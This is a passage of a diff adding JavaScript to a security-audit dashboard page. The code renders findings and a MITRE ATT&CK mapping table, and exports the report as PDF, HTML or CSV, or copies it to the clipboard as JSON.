+                </thead>
+                <tbody>
+                    ${findings.map(function(f,idx){
+                        var sev=(f.severity||'').toUpperCase();
+                        var col=sev==='CRITICAL'?'#ef4444':sev==='HIGH'?'#f97316':sev==='MEDIUM'?'#eab308':'#22c55e';
+                        return '<tr style="background:'+(idx%2===0?'#fafafa':'white')+';">' +
+                            '<td style="padding:6px;border:1px solid #ddd;text-align:center;color:'+col+';font-weight:bold;">'+(f.severity||'UNKNOWN')+'</td>' +
+                            '<td style="padding:6px;border:1px solid #ddd;">'+(f.type||'Unknown')+'</td>' +
+                            '<td style="padding:6px;border:1px solid #ddd;">'+(f.target||'N/A')+'</td>' +
+                            '<td style="padding:6px;border:1px solid #ddd;font-family:monospace;font-size:9px;word-break:break-all;white-space:normal;">'+(f.evidencePath||f.path||'-')+'</td>' +
+                            '<td style="padding:6px;border:1px solid #ddd;text-align:center;">'+(f.principal||'-')+'</td>' +
+                            '</tr>';
+                    }).join('')}
+                </tbody>
+            </table>
+        </div>
+        <div style="margin-bottom:20px;">
+            <h2 style="color:#2563eb;">🎯 MITRE ATT&amp;CK MAPPING</h2>
+            <table style="width:100%;border-collapse:collapse;border:1px solid #ddd;">
+                <thead><tr style="background:#f5f5f5;"><th style="padding:8px;border:1px solid #ddd;">Technique</th><th style="padding:8px;border:1px solid #ddd;">Tactic</th><th style="padding:8px;border:1px solid #ddd;">ID</th></tr></thead>
+                <tbody>
+                    <tr><td style="padding:6px;border:1px solid #ddd;">Service Modification</td><td style="padding:6px;border:1px solid #ddd;">Persistence</td><td style="padding:6px;border:1px solid #ddd;">T1543.003</td></tr>
+                    <tr style="background:#f5f5f5;"><td style="padding:6px;border:1px solid #ddd;">Unquoted Service Path</td><td style="padding:6px;border:1px solid #ddd;">Privilege Escalation</td><td style="padding:6px;border:1px solid #ddd;">T1574.009</td></tr>
+                    <tr><td style="padding:6px;border:1px solid #ddd;">Registry Run Keys</td><td style="padding:6px;border:1px solid #ddd;">Persistence</td><td style="padding:6px;border:1px solid #ddd;">T1547.001</td></tr>
+                    <tr style="background:#f5f5f5;"><td style="padding:6px;border:1px solid #ddd;">Scheduled Task</td><td style="padding:6px;border:1px solid #ddd;">Persistence</td><td style="padding:6px;border:1px solid #ddd;">T1053.005</td></tr>
+                </tbody>
+            </table>
+        </div>
+        <div style="margin-top:30px;text-align:center;font-size:10px;color:#666;">
+            <hr>
+            <p>📄 Report generated by Defensive Listener Lab</p>
+            <p>${new Date().toLocaleString()} - All rights reserved</p>
+        </div>`;
+
+    document.body.appendChild(pdfContent);
+
+    if (typeof html2canvas !== 'undefined' && typeof window.jspdf !== 'undefined') {
+        html2canvas(pdfContent, { scale: 2, backgroundColor: '#ffffff' }).then(function(canvas) {
+            var imgData   = canvas.toDataURL('image/png');
+            var { jsPDF } = window.jspdf;
+            var pdf       = new jsPDF('p', 'mm', 'a4');
+            var imgWidth  = 210;
+            var pageH     = 297;
+            var imgHeight = (canvas.height * imgWidth) / canvas.width;
+            pdf.addImage(imgData, 'PNG', 0, 0, imgWidth, imgHeight);
+            var left = imgHeight - pageH;
+            var pos  = -pageH;
+            while (left > 0) {
+                pdf.addPage();
+                pdf.addImage(imgData, 'PNG', 0, pos, imgWidth, imgHeight);
+                left -= pageH;
+                pos  -= pageH;
+            }
+            pdf.save('security_report_' + (system.MachineName || 'unknown') + '_' + Date.now() + '.pdf');
+            document.body.removeChild(pdfContent);
+            if (typeof toast === 'function') toast('✅ PDF Report generated!', 'success');
+        }).catch(function(err) {
+            console.error(err);
+            document.body.removeChild(pdfContent);
+            if (typeof toast === 'function') toast('❌ Error generating PDF', 'error');
+        });
+    } else {
+        var blob = new Blob([pdfContent.innerHTML], { type: 'text/html' });
+        var url  = URL.createObjectURL(blob);
+        var a    = document.createElement('a');
+        a.href   = url;
+        a.download = 'security_report_' + (system.MachineName || 'unknown') + '_' + Date.now() + '.html';
+        a.click();
+        URL.revokeObjectURL(url);
+        document.body.removeChild(pdfContent);
+        if (typeof toast === 'function') toast('📄 HTML report generated (PDF libs missing)', 'info');
+    }
+};
+
+window.exportCSV = function() {
+    var auditReport = window.selectedAuditReportDetail;
+    if (!auditReport || !auditReport.report_json) { alert('Veuillez sélectionner un rapport d\'audit d\'abord'); return; }
+    var data     = JSON.parse(auditReport.report_json);
+    var findings = data.findings || [];
+    var csv = 'Severity,Type,Target,Evidence Path\n';
+    for (var i = 0; i < findings.length; i++) {
+        csv += '"'+(findings[i].severity||'')+'","'+(findings[i].type||'')+'","'+(findings[i].target||'')+'","'+(findings[i].evidencePath||'')+'"\n';
+    }
+    var blob = new Blob([csv], { type: 'text/csv' });
+    var url  = URL.createObjectURL(blob);
+    var a    = document.createElement('a');
+    a.href   = url;
+    a.download = 'vulnerability_report_' + Date.now() + '.csv';
+    a.click();
+    URL.revokeObjectURL(url);
+    if (typeof toast === 'function') toast('✅ CSV exported!', 'success');
+};
+
+window.copyReportJson = function() {
+    var auditReport = window.selectedAuditReportDetail;
+    if (!auditReport || !auditReport.report_json) { alert('Veuillez sélectionner un rapport d\'audit d\'abord'); return; }
+    navigator.clipboard.writeText(auditReport.report_json);
+    if (typeof toast === 'function') toast('✅ JSON copied!', 'success');
+};
+    </script>
+</body>
+</html>
